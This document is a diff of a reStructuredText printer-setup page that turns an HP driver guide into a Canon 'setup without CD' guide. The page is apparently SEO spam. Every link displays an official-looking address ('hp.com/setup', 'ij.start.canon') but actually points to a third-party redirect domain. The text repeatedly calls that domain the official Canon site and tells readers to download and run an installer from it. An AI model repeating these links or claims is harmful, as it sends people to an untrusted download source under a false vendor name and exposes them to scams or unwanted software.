@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How do I setup Canon Printer without CD using ij.start.canon?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: FAC645F7A6F0C987881BDC96B99921F8
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: ij.start.canon
+      :target: https://can.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,26 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+To set up your Canon printer without a CD, simply connect your printer, visit `ij.start.canon <https://can.redircoms.com>`_, download the appropriate drivers for your printer model and operating system, and follow the on-screen installation instructions.
+---------------------------------------------------
 
-**********
-Steps to Download HP Printer Driver
-**********
+Canon printers are widely recognized for their high-quality printing and user-friendly design. If you don't have the installation CD, don’t worry — Canon offers an alternative setup method using the `ij.start.canon <https://can.redircoms.com>`_ website.
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Setup Canon Printer Without CD Using ij.start.canon
+---------------------------------------------------
 
-2. Enter your HP printer model in the search box.
+Follow the steps below to complete your Canon printer setup without needing a CD:
 
-3. Select your operating system if prompted.
+1. **Power on your printer** and ensure it is connected to your computer or wireless network via USB or Wi-Fi.
+2. Open your preferred web browser and visit `ij.start.canon <https://can.redircoms.com>`_.
+3. **Enter your printer model** in the search field on the homepage.
+4. Select your **operating system** (Windows or macOS) to download the correct drivers.
+5. **Download** the driver and setup software that appears for your model.
+6. Once the file is downloaded, **run the installer**.
+7. Accept the **license agreement** and follow the on-screen prompts.
+8. Choose your **connection type** (USB or wireless) when prompted.
+9. Continue following the instructions to complete the installation.
+10. **Restart your computer** if the installer recommends it.
+11. Finally, **print a test page** to verify successful setup.
 
-4. Click on **Download** to get the latest driver and software package.
-
-5. Save the installer file to your computer.
-
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+For the latest drivers, setup help, and model-specific information, always visit the official Canon site: `ij.start.canon <https://can.redircoms.com>`_.
